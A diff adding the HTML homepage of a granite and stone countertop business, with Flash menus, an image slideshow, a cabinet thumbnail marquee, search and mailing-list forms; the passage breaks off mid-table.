@@ -1,0 +1,1942 @@
+
+
+
+
+
+
+
+<html>
+
+
+
+<head>
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+
+
+<title>.:: GRANITE & STONE  ::.</title>
+
+
+
+<link href="style/style1.css" rel="stylesheet" type="text/css">
+</head>
+
+
+
+
+
+
+
+<body>
+
+
+
+<script src="js/preview_templates.js" language="JavaScript" type="text/javascript"></script>
+
+
+
+<script src="js/loader.js" language="JavaScript" type="text/javascript"></script>
+
+
+
+<script>
+
+
+
+function sendToFlash(linkpath) {
+
+
+
+	thisMovie("FTextTool").sendLink(linkpath);
+
+
+
+}
+
+
+
+
+
+
+
+function sendToFlash1(linkpath) {
+
+
+
+	thisMovie("FTextTool").sendLink1(linkpath);
+
+
+
+}
+
+
+
+
+
+
+
+function thisMovie(movieName) {
+
+
+
+    if (navigator.appName.indexOf("Microsoft") != -1) {
+
+
+
+        return window[movieName]
+
+
+
+    }
+
+
+
+    else {
+
+
+
+        return document[movieName]
+
+
+
+    }
+
+
+
+}
+
+
+
+
+
+
+
+function getObj(name)
+
+
+
+{   if (document.getElementById) { return document.getElementById(name); }
+
+
+
+		else if (document.all)       { return document.all[name]; }
+
+
+
+		else if (document.layers)    { return document.layers[name]; }
+
+
+
+}
+
+
+
+	var aImages1 = new Array("images1/uploads/maxima5a.jpg","images1/uploads/maxima.jpg","images1/uploads/may4.jpg")
+
+
+
+	
+
+
+
+	var iDisplay = 3000
+
+
+
+	var oTimer = null
+
+
+
+	var iCurrent1 = 0
+
+
+
+	var sSource = ""
+
+
+
+	
+
+
+
+	function initScrollImg()
+
+
+
+	{
+
+
+
+		setInterval("klload()", iDisplay)
+
+
+
+	}
+
+
+
+
+
+
+
+	function start_show()
+
+
+
+	{
+
+
+
+		getObj("slideShow1").src = aImages1[0]
+
+
+
+	}
+
+
+
+
+
+
+
+
+
+
+
+	function klload()
+
+
+
+	{		
+
+
+
+		iCurrent1++;
+
+
+
+			if (iCurrent1 >= aImages1.length)
+
+
+
+				iCurrent1 = 0;
+
+
+
+			var myImg1 = aImages1[iCurrent1]
+
+
+
+			
+
+
+
+			var what1 = "slideShow1"
+
+
+
+			if (getObj(what1).filters)
+
+
+
+			{	getObj(what1).filters[0].Stop()
+
+
+
+				getObj(what1).filters[0].Apply()
+
+
+
+				getObj(what1).filters.revealTrans.transition= 23
+
+
+
+				getObj(what1).src = myImg1
+
+
+
+				getObj(what1).filters[0].Play()
+
+
+
+			}
+
+
+
+			
+
+
+
+	}
+
+
+
+	
+
+
+
+</script>
+
+
+
+<body onLoad="start_show();" >
+
+
+
+<div style="position: absolute; z-index: 110; top: 100px; display: none; left: -500px;" id="preview_div">
+
+
+
+</div>
+
+
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#000000">
+
+
+
+  <tr>
+
+
+
+    <td>
+
+
+
+	<table width="900" border="0" cellspacing="0" cellpadding="0"  align="center">
+
+
+
+      <tr height=40>
+
+
+
+        <td  style="padding-right:65" align="right"><span class="font_cam"><a href="?vnTRUST=act:contact"><strong>HOTLINE: (781) 251-9700</strong></a></span><a href="?vnTRUST=act:contact"> <img src="images1/icon_email.jpg"  align="absmiddle">&nbsp;Contact</a></td>
+
+
+
+      </tr>
+
+
+
+    </table>	</td>
+
+
+
+  </tr>
+
+
+
+  <tr>
+
+
+
+    <td><table width="900" border="0" cellspacing="0" cellpadding="0" align="center">
+
+
+
+      <tr>
+
+
+
+        <td width="261" valign="bottom" background="images1/l_banner.jpg"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+          <tr>
+
+
+
+            <td align="right"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="196" height="305">
+
+
+
+                <param name="movie" value="images1/menu.swf">
+
+
+
+                <param name="quality" value="high">
+
+
+
+                <param name="wmode" value="transparent">
+
+
+
+                <embed src="images1/menu.swf" width="196" height="305" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent"></embed>
+
+
+
+            </object></td>
+
+
+
+          </tr>
+
+
+
+        </table>		</td>
+
+
+
+        <td valign="top" height="429" background="images1/hinhlon.jpg"><table width="100%" border="0" cellspacing="0" cellpadding="0" >
+
+
+
+            <tr>
+
+
+
+              <td style="padding-left:38px;padding-top:69px;" height="100%" valign="top"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="526" height="350" align="middle">
+
+
+
+                  <param name="movie" value="images1/hinh1.swf">
+
+
+
+                  <param name="quality" value="high">
+
+
+
+                  <param name="wmode" value="transparent">
+
+
+
+                  <embed src="images1/hinh1.swf" width="526" height="350" align="middle" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent"></embed>
+
+
+
+              </object></td>
+
+
+
+            </tr>
+
+
+
+        </table></td>
+
+
+
+      </tr>
+
+
+
+    </table></td>
+
+
+
+  </tr>
+
+
+
+  <tr>
+
+
+
+    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+      <tr>
+
+
+
+        <td  background="images1/bg_nav.jpg" height="43" ><table width="900" border="0" cellspacing="0" cellpadding="0" align="center">
+
+
+
+            <tr>
+
+
+
+              <td width="261" align="right" valign="bottom"><table width="196" border="0" cellspacing="0" cellpadding="0" background="images1/bg_left.jpg">
+
+
+
+                  <tr>
+
+
+
+                    <td height="18"></td>
+
+
+
+                  </tr>
+
+
+
+              </table></td>
+
+
+
+              <td  valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+                  <tr>
+
+
+
+                    <td height="25" align="left">
+
+
+
+					Sunday, 03/02/2019
+
+
+					</td>
+
+
+
+                  </tr>
+
+
+
+              </table></td>
+
+
+
+              <td width="265" height="43" valign="bottom"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+                  <tr >
+
+
+
+                    <td width="15"><img src="images1/l_search.jpg" width="15" height="38" /></td>
+
+
+
+                    <td width="260" background="images1/bg_search.jpg"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+                        <form action="?vnTRUST=act:main" method="post" name="form2" id="form2">
+
+
+
+                          <tr>
+
+
+
+                            <td width="25%" align="center"><strong>SEARCH</strong></td>
+
+
+
+                            <td><input type="text" name="stoneID"  size="18" value="Stone ID" style="background:#333333; color:#CCCCCC;" />
+
+
+
+                            </td>
+
+
+
+                            <td width="10%" align="center"><input name="" type="image" src="images1/btn_search.jpg"></td>
+
+
+
+                          </tr>
+
+
+
+                        </form>
+
+
+
+                    </table></td>
+
+
+
+                    <td width="6"><img src="images1/r_search.jpg" width="6" height="38" /></td>
+
+
+
+                  </tr>
+
+
+
+              </table></td>
+
+
+
+              <td width="64">&nbsp;</td>
+
+
+
+            </tr>
+
+
+
+        </table></td>
+
+
+
+      </tr>
+
+
+
+    </table></td>
+
+
+
+  </tr>
+
+
+
+</table>
+
+
+
+
+
+
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0" align="center" background="images1/bg.jpg">
+
+
+
+  <tr>
+
+
+
+    <td><table width="900" height="1009" border="0" align="center" cellpadding="0" cellspacing="0">
+
+
+
+      <tr>
+
+
+
+        <td width="261" align="right" valign="top" height="100%" >
+
+
+
+			<table width="196" border="0" cellspacing="0" cellpadding="0" height="100%" background="images1/bg_left.jpg">
+
+
+
+              <tr>
+
+
+
+                <td valign="top">
+
+
+
+				
+
+
+
+				
+
+
+
+				<table width="100%"  border="0" cellspacing="0" cellpadding="0" align="center">
+
+
+
+                  <tr>
+
+
+
+                    <td >
+
+
+
+					
+
+
+
+					
+
+
+
+					<table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+                      <tr  valign="top" height="20">
+
+
+
+                        <td align="right" style="padding-right:5px;"><strong><a href="?vnTRUST=act:news"> News </a> </strong></td>
+
+
+
+                      </tr>
+
+
+
+                      <tr>
+
+
+
+                        <td><img src="images1/line_menu.jpg" width="196" height="1"></td>
+
+
+
+                      </tr>
+
+
+
+					  </table>
+
+
+
+					  
+
+
+
+		  
+
+
+			     <table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+					<tr height="25">
+
+
+
+                    <td align="right" style="padding-right:5px;">
+
+
+
+					<strong><a href="?vnTRUST=act:product_cat|cat_id:26">Kitchen Gallery</a></strong>					</td>
+
+
+
+                      </tr>
+
+
+
+                      <tr>
+
+
+
+                        <td><img src="images1/line_menu.jpg" width="196" height="1"></td>
+
+
+
+                      </tr>
+
+
+
+			     </table>
+
+
+
+			   
+
+
+			     <table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+					<tr height="25">
+
+
+
+                    <td align="right" style="padding-right:5px;">
+
+
+
+					<strong><a href="?vnTRUST=act:product_cat|cat_id:27">Bathroom Gallery</a></strong>					</td>
+
+
+
+                      </tr>
+
+
+
+                      <tr>
+
+
+
+                        <td><img src="images1/line_menu.jpg" width="196" height="1"></td>
+
+
+
+                      </tr>
+
+
+
+			     </table>
+
+
+
+			   
+
+
+					  
+
+
+
+					  
+
+
+
+				<table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+					<tr height="25">
+
+
+
+                    <td align="right" style="padding-right:5px;">
+
+
+
+					<strong><a href="?vnTRUST=act:stone">Stone Selection </a></strong>					</td>
+
+
+
+                    </tr>
+
+
+
+                    <tr>
+
+
+
+                        <td><img src="images1/line_menu.jpg" width="196" height="1"></td>
+
+
+
+                      </tr>
+
+
+
+			  </table>
+
+
+
+					  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+					  <tr height="25">
+
+
+
+                        <td align="right" style="padding-right:5px;">
+
+
+
+						<strong><a href="?vnTRUST=act:about">About us </a> </strong>						</td>
+
+
+
+                      </tr>
+
+
+
+                      <tr>
+
+
+
+                        <td><img src="images1/line_menu.jpg" width="196" height="1"></td>
+
+
+
+                      </tr>
+
+
+
+					  </table>
+
+
+
+					  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+					  <tr height="25">
+
+
+
+                        <td align="right" style="padding-right:5px;">
+
+
+
+						<strong><a href="?vnTRUST=act:contact">Contact us </a> </strong></td>
+
+
+
+                      </tr>
+
+
+
+                      <tr>
+
+
+
+                        <td><img src="images1/line_menu.jpg" width="196" height="1"></td>
+
+
+
+                      </tr>
+
+
+
+                    </table>
+
+					<table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+                        <tr height="25">
+
+                          <td align="right" style="padding-right:5px;"><strong><a href="?vnTRUST=act:quotation">Free Quotation  </a> </strong></td>
+
+                        </tr>
+
+                        <tr>
+
+                          <td><img src="images/line_menu.jpg" width="196" height="1"></td>
+
+                        </tr>
+
+                      </table>
+
+					</td>
+
+
+
+                  </tr>
+
+
+
+                </table>
+
+
+
+                  <br>
+
+
+
+                <table width="100%"  border="0" cellspacing="0" cellpadding="0" align="center">
+
+
+
+                  <tr>
+
+
+
+                    <td align="center"><img id="slideShow1"  src="images1/uploads/maxima5a.jpg" STYLE="filter: revealTrans(TRANSITION=2)"  width="150"  height="80" class="border_pro" > </td>
+
+
+
+                    </tr>
+
+
+
+                  <tr>
+
+
+
+                    <td align="center"><script language="JavaScript">initScrollImg()</script></td>
+
+
+
+                    </tr>
+
+
+
+                  </table>
+
+
+
+                  <br>
+
+
+
+                  <table width="95%"  border="0" cellspacing="2" cellpadding="2" align="center">
+
+
+
+                    <tr>
+
+
+
+                      <td align="center"><a href="?vnTRUST=act:quotation" > <img src="images1/quotation.jpg"   border="0"></a></td>
+
+
+
+                    </tr>
+
+
+
+                    <tr>
+
+
+
+                      <td align="center" height="10"></td>
+
+
+
+                    </tr>
+
+
+
+                    
+
+
+                  </table>
+
+
+
+                  <br>
+
+
+
+                  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+                    
+
+
+
+                    <tr>
+
+
+
+                      <td background="images1/bg_left.jpg" >
+
+
+
+                        
+
+
+
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+                          <tr>
+
+
+
+                            <td >
+
+
+
+							<img src="images1/news_event.gif" width="196" height="30"></td>
+
+
+
+				         </tr>
+
+
+
+						 <tr><td>
+
+
+
+						 <table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+					 
+
+
+						  <tr height="20">
+
+
+
+                            <td style="padding:5px" ><div align="justify"><img src="images1/arr_news.jpg" align="absmiddle">&nbsp; <a href="?vnTRUST=act:news_detail|newsid:2">CNC Technology </a></div></td>
+
+
+
+						    </tr>
+
+
+
+				  
+
+
+						  </table>
+
+
+
+						 </td></tr>
+
+
+
+                          <tr height="10"> <td align="center">&nbsp;</td>    </tr>
+
+
+
+						</table>
+
+
+
+				  <br>
+
+
+
+                    
+
+
+
+					<table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+                      <tr>
+
+
+
+                         <td><img src="images1/web_link.jpg" width="196" height="33"></td>
+
+
+
+				       </tr>
+
+
+
+                      <tr height="20"><td align="center">&nbsp;</td></tr>
+
+
+
+					  
+
+
+                          <tr height="20"> <td  style="padding-left:30px;"><a href="http://www.marbleandgranite.com" target="_blank"> www.marbleandgranite.com</a></td></tr>
+
+
+
+                     
+
+
+                          <tr height="20"> <td  style="padding-left:30px;"><a href="http://www.belstone.com" target="_blank"> www.belstone.com</a></td></tr>
+
+
+
+                     
+
+
+                          <tr height="20"> <td  style="padding-left:30px;"><a href="http://www.msistone.com" target="_blank"> www.msistone.com</a></td></tr>
+
+
+
+                     
+
+
+					  <tr height="10"><td align="center">&nbsp;</td></tr>
+
+
+
+                 </table>
+
+
+
+					
+
+
+
+					  <br>
+
+
+
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+                          <form name="form1" method="post" action="">
+
+
+
+                            <tr>
+
+
+
+                              <td><img src="images1/mail_list.jpg" width="196" height="30"></td>
+
+
+
+				    </tr>
+
+
+
+                            <tr height="10">
+
+
+
+                              <td align="center">&nbsp;</td>
+
+
+
+				     </tr>
+
+
+
+                            <tr height="30">
+
+
+
+                              <td align="center"><table border="0" width="95%" cellpadding="0" cellspacing="0" align=center >
+
+
+
+                                <tr>
+
+
+
+                                  <td align="center" height="20">
+
+
+
+								  Input your email to receive our news and special								  </td>
+
+
+
+                                </tr>
+
+
+
+                                <tr>
+
+
+
+                                  <td align=center><input type="text" name="f_email" value=""   class="input_text"/>                                  </td>
+
+
+
+                                </tr>
+
+
+
+                                <tr>
+
+
+
+                                  <td align=center><input name="btnMailList" type="submit" value="Send" class="button"></td>
+
+
+
+                                </tr>
+
+
+
+                              </table></td>
+
+
+
+				      </tr>
+
+
+
+                          </form>
+
+
+
+				  </table>
+
+
+
+					  
+
+
+
+					<br>
+
+
+
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+                          <tr>
+
+
+
+                            <td><img src="images1/statistics.jpg" width="196" height="28"></td>
+
+
+
+				    </tr>
+
+
+
+                          <tr height="30">
+
+
+
+                            <td align="center"><table width="100%"  border="0" cellspacing="2" cellpadding="2" align="center">
+
+
+
+
+
+
+
+                              <tr>
+
+
+
+                                <td  style="padding-left:30px;">Online : <b>27</b></td>
+
+
+
+                              </tr>
+
+
+
+                              <tr>
+
+
+
+                                <td  style="padding-left:30px;">Visiter : <b>953001</b> </td>
+
+
+
+                              </tr>
+
+
+
+                            </table></td>
+
+
+
+				     </tr>
+
+
+
+                        </table>
+
+
+
+					  <br>					  </td>
+
+
+
+                    </tr>
+
+
+
+                </table>				</td></tr>
+
+
+
+            </table>
+
+
+
+		<!--end left --></td>
+
+
+
+        <td valign="top" height="100%" v>
+
+
+
+		<table width="100%" border="0" cellspacing="0" cellpadding="0" height="100%" >
+
+
+
+  <tr>
+
+
+
+    <td  height="20" colspan="2"></td>
+
+
+
+  </tr>
+
+
+
+  <tr>
+
+
+
+	  <td width="6"   ></td>
+
+
+
+    <td  valign="top"  bgcolor="#574833" class="tableborder"><!--main -->
+
+
+
+	<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td background="images1/line2.jpg"><img src="images1/line2.jpg" width="4" height="1" /></td>
+  </tr>
+  <tr>
+    <td height="309" valign="top" background="images1/bg_main1.jpg" style="padding:10px"><table width="100%"  border="0" cellspacing="2" cellpadding="2">
+      <tr>
+        <td width="35%" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="10"><img src="images1/l_t_box1.jpg" width="10" height="10" /></td>
+                <td><img src="images1/t_box1.jpg" width="179" height="10" /></td>
+                <td width="10"><img src="images1/r_t_box1.jpg" width="10" height="10" /></td>
+              </tr>
+            </table></td>
+          </tr>
+          <tr>
+            <td bgcolor=""><table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="10"><img src="images1/l_box1.jpg" width="10" height="159" /></td>
+                <td valign="top" bgcolor="#FFFFFF" align="center"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="20"><img src="images1/1.jpg" width="20" height="20" /></td>
+                    <td align="center" valign="top"><a href="javascript:void(0);" onmousedown="scroll_cabinet.scrollAmount=4;" onmousemove="scroll_cabinet.start(); scroll_cabinet.scrollAmount=2; scroll_cabinet.direction='up';" onmouseout="scroll_cabinet.stop();"><img border="0" src="images1/arrow_top.jpg" /></a> </td>
+                    <td width="20"><img src="images1/2.jpg" width="20" height="20" /></td>
+                  </tr>
+                  <tr>
+                    <td>&nbsp;</td>
+                    <td align="center"><marquee id="scroll_cabinet"  height="115" scrollamount="4" loop="0" direction="up">
+                      <center>
+                        <table border="0"  cellpadding="1" cellspacing="0"  >
+                          <tr>
+                                                        <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p21_wwwGlaze_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p21_wwwGlaze_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="37" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('p20_chrBlsm_1_.jpg');"><img src="view_thumb.php?image=cabinets/p20_chrBlsm_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="36" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p19_selChPref_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p19_selChPref_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="35" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p18_redOakWashingtonCherry_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p18_redOakWashingtonCherry_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="34" /></a>
+                                </tr><tr>                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p17_redOakPewterGlaze_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p17_redOakPewterGlaze_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="33" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p17_conestoga_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p17_conestoga_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="32" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p16_redOakNutmeg_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p16_redOakNutmeg_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="31" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p16_presidentialSquare_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p16_presidentialSquare_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="30" /></a>
+                                </tr><tr>                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p15_redOakNaturalPewter_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p15_redOakNaturalPewter_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="29" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p15_monarchCathedral_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p15_monarchCathedral_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="28" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p14_redOakNatural_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p14_redOakNatural_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="27" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p14_presidentialCath_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p14_presidentialCath_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="26" /></a>
+                                </tr><tr>                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p13_redOakHoneyPewter_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p13_redOakHoneyPewter_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="25" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p12_redOakHarvGoldCaramel_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p12_redOakHarvGoldCaramel_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="24" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p11_victorianMahogany_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p11_victorianMahogany_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="23" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p11_redOakAlpinePewter_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p11_redOakAlpinePewter_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="22" /></a>
+                                </tr><tr>                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p10_secret_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p10_secret_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="21" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p10_hardMaplePewter_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p10_hardMaplePewter_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="20" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p09_sanibelMaple_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p09_sanibelMaple_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="19" /></a>
+                                                            <td  align="left" onmouseover="this.bgColor='#233F31' ; scroll_cabinet.stop();"  onmouseout="this.bgColor='#FFFFFF'"  onclick="scroll_cabinet.stop();" ><a href="javascript:sendToFlash1('1_p09_hardMapleNutmegBrown_1_.jpg');"><img src="view_thumb.php?image=cabinets/1_p09_hardMapleNutmegBrown_1_.jpg&amp;w=30" height="30" border="0" width="30"  alt="18" /></a>
+                                                            </td>
+                                                      </tr>
+                        </table>
+                      </center>
+                    </marquee></td>
+                    <td>&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td><img src="images1/4.jpg" width="20" height="20" /></td>
+                    <td align="center" valign="bottom"><a href="javascript:void(0);" onmousedown="scroll_cabinet.scrollAmount=4;"  onmousemove="scroll_cabinet.start(); scroll_cabinet.scrollAmount=2; scroll_cabinet.direction='down';" onmouseout="scroll_cabinet.stop();"><img border="0" src="images1/arrow_down.jpg" /></a></td>
+                    <td><img src="images1/3.jpg" width="20" height="20" /></td>
+                  </tr>
+                </table></td>
+                <td width="10"><img src="images1/r_box1.jpg" width="10" height="159" /></td>
+              </tr>
+            </table></td>
+          </tr>
+          <tr>
+            <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="10"><img src="images1/l_b_box1.jpg" width="10" height="10" /></td>
+                <td><img src="images1/b_box1.jpg" width="179" height="10" /></td>
+                <td width="10"><img src="images1/r_b_box1.jpg" width="10" height="10" /></td>
+              </tr>
+            </table></td>
+          </tr>
+        </table></td>
+        <td width="65%" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="10"><img src="images1/l_t_box2.jpg"></td>
+                <td background="images1/t_box2.jpg"><img src="images1/t_box2.jpg"></td>
+                <td width="10"><img src="images1/r_t_box2.jpg"></td>
+              </tr>
+            </table></td>
+          </tr>
+          <tr>
+            <td bgcolor=""><table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="9"><img src="images1/l_box2.jpg" width="9" height="252"></td>
+                <td valign="top" bgcolor="#FFFFFF" align="center"><object id="FTextTool" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" width="300" height="250" scale="exactfit" align="middle">
+                  <param name="movie" value="main.swf?hhh=439646" />
+                  <param name="quality" value="high" />
+                  <param name="scale" value="exactfit" />
+                  <param name="bgcolor" value="#FFFFFF" />
+                  <param nam="allowScriptAccess" value="always" />
+                  <param name="wmode" value="transparent" />
+                  <embed src="main.swf?hhh=186814" allowscriptaccess="always" quality="high" bgcolor="#ffffff" width="300" height="250" scale="exactfit" align="middle" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" /></embed>
+                </object></td>
+                <td width="7"><img src="images1/r_box2.jpg" width="7" height="252"></td>
+              </tr>
+            </table></td>
+          </tr>
+          <tr>
+            <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="10"><img src="images1/l_b_box2.jpg"></td>
+                <td background="images1/b_box2.jpg"><img src="images1/b_box2.jpg" /></td>
+                <td width="10"><img src="images1/r_b_box2.jpg"></td>
+              </tr>
+            </table></td>
+          </tr>
+        </table></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td  valign="top" background="images1/line_vang.jpg"><img src="images1/line_vang.jpg"></td>
+  </tr>
+</table>
+<br />
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td background="images1/line2.jpg"><img src="images1/line2.jpg" width="4" height="1" /></td>
+  </tr>
+  <tr>
+    <td height="309" valign="top" background="images1/bg_main2.jpg" align="center" style="padding-top:10px;padding-bottom:5px;"><table width="90%" border="0" cellspacing="0" cellpadding="0" align="center">
+      <tr>
+        <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td width="13"><img src="images1/l_t_box3.jpg" width="13" height="13"></td>
+            <td background="images1/t_box3.jpg"><img src="images1/t_box3.jpg"></td>
+            <td width="13"><img src="images1/r_t_box3.jpg" width="13" height="13"></td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td bgcolor=""><table width="100%" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td width="10"><img src="images1/l_box3.jpg" width="10" height="340"></td>
